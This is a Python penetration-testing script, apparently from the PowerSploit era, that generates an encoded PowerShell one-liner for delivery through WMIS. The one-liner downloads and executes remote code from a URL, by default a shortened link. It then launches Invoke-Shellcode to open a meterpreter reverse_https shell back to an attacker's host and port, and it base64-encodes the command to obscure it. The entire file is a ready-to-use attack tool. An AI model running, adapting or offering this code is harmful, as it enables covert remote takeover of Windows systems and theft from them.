#!/usr/bin/env python
#
# EncodeShell.py
# Simple python script to output meterpreter commands for WMIS
# by Chris Campbell (obscuresec)
#
import base64
import sys

def build(url,lhost,lport):
    #build script syntax
    script = "IEX (New-Object Net.WebClient).DownloadString('{0}'); Invoke-Shellcode ".format(url)
    script += "-Payload windows/meterpreter/reverse_https -Lhost {0} -Lport {1} -Force".format(lhost,lport)

    print "The powershell syntax to be run:"
    print ""
    print script
    print ""

    #convert string to LE Unicode
    unicode = script.encode('utf_16_le')
    
    #base64 encode the script portion
    encoded = base64.b64encode(unicode)
 
    #build the final command
    cmd = "cmd.exe /c powershell.exe -nop -nol -enc {0}".format(encoded)

    #check length in case long url is provided
    #http://support.microsoft.com/kb/830473
    cmdlen = len(cmd)
    if cmdlen > 8191:
        print "The length of the command is to long to use! Limit is 8191"
        print "Try using a URL shortener."
    return cmd
 
#grab args
try:
    lhost = sys.argv[1]
    lport = sys.argv[2]
    url = sys.argv[3]
    
    if url == 'default':
        url = 'http://bit.ly/14bZZ0c'

    ps = build(url,lhost,lport)
    
    print "The command is:"
    print ""
    print ps	
  
#index error
except IndexError:
    print "python EncodeShell.py lhost lport url"
    print "ex: python EncodeShell.py '192.268.4.5' '443' 'default'"
    print "ex: python EncodeShell.py '192.268.4.5' '443' 'http://192.168.4.5/powersploit/invoke-shellcode/'"
